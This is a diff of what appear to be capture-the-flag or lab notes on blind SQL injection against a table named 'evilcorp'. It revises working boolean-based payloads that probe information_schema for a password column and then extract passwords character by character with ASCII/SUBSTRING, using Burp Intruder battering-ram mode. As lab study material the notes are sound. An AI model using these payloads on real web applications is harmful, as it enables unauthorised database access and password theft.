@@ -249,9 +249,10 @@ name=evilcorpguess1&country=' OR (SELECT table_name FROM information_schema.tabl
 
 Fantastic. Next, can we guess that there is a password column inside this table? 
 
-' OR (SELECT column_name FROM information_schema.columns WHERE table_schema='users' AND table_name='evilcorp' AND column_name='password' LIMIT 1) = 'password') -- -
+    We would also intruder this 0,1 
+' OR (SELECT column_name FROM information_schema.columns WHERE table_schema='users' AND table_name='evilcorp' AND column_name='password' LIMIT 0,1) = 'password') -- -
 
-name=columnguess1_password&country=' OR (SELECT column_name FROM information_schema.columns WHERE table_schema='users' AND table_name='evilcorp' AND column_name='password' LIMIT 1) = 'password') -- -
+name=columnguess1_password&country=' OR (SELECT column_name FROM information_schema.columns WHERE table_schema='users' AND table_name='evilcorp' AND column_name='password' LIMIT 0,1) = 'password') -- -
 
 Yes. So for our guesses, we have quickly figured out:
   database:users
@@ -265,9 +266,10 @@ Yes. So for our guesses, we have quickly figured out:
 
 Here's an example payload that extracts the contents of the "password" column character by character:
 
-name=dbusersguess&country=' OR ASCII(SUBSTRING((SELECT password FROM evilcorp LIMIT 1), X, 1)) = Y) --
+name=dbusersguess&country=' OR ASCII(SUBSTRING((SELECT password FROM evilcorp LIMIT A,1), X, 1)) = Y) --
 
 In this payload, you need to replace X with the position of the character you want to retrieve (starting from 1), 
+    A needs to be found by cycline and seeing which one hits for all the Y values over X 
 and Y with the ASCII value of the character you want to compare against. By iterating through different values of X and Y, 
 you can gradually retrieve the characters of the "password" column.
 
@@ -279,7 +281,8 @@ It is not an efficient approach, especially for retrieving large amounts of data
 
 Set position, use burp to solve 
 mode: battering ram, set on two positions for numbers 100 below
-name=dumpone100&country=' OR ASCII(SUBSTRING((SELECT password FROM evilcorp LIMIT 1), 1, 1)) = 100) -- -
+    
+name=dumpone100&country=' OR ASCII(SUBSTRING((SELECT password FROM evilcorp LIMIT 0,1), 1, 1)) = 100) -- -
 
 Note the strategic name 
 
